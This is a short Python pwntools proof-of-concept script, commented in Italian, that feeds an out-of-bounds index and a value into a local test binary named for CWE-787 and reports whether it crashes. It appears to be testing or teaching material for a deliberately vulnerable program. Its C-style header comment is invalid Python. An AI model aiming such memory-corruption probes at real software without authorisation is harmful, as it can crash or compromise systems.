/**
 * @file Exploit_Array_Index_OOB.py
 * @brief PoC per CWE-787 Array Index OOB
 * Target: build/CWE-787 Array Index OOB
 */
from pwn import *

context.log_level = 'info'

def exploit():
    exe = './build/CWE-787 Array Index OOB'
    
    log.info(f"Avvio {exe}...")
    p = process(exe)

    # Indice fuori dai limiti (array ha size 5, indici 0-4)
    # 100 è sicuramente fuori e probabilmente scriverà su memoria non valida o sovrascriverà variabili critiche
    oob_index = b"100"
    valore = b"12345"

    log.info(f"Invio indice OOB: {oob_index.decode()}")
    p.sendline(oob_index)
    
    log.info(f"Invio valore: {valore.decode()}")
    p.sendline(valore)

    try:
        output = p.recvall(timeout=2)
        log.info(f"Output:\n{output.decode(errors='ignore')}")
        
        if p.poll() != 0:
            log.success("Il programma è crashato (Segmentation Fault probabile)!")
        else:
            log.warning("Il programma è terminato normalmente (Memoria corrotta silenziosamente?)")
            
    except Exception as e:
        log.error(f"Errore: {e}")

if __name__ == "__main__":
    exploit()
